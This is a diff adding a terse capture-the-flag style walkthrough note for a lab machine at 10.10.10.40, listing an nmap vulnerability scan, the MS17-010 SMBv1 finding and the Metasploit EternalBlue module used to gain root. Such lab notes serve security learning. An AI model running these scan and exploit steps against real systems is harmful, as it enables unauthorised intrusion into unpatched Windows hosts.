@@ -1,0 +1,6 @@
+1.nmap scan --> nmap -sV -T4 -Pn --script vuln 10.10.10.40
+It shows this --> Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+2.Let's use metasploit for this one
+3.using --> exploit/windows/smb/ms17_010_eternalblue
+4.got root
+
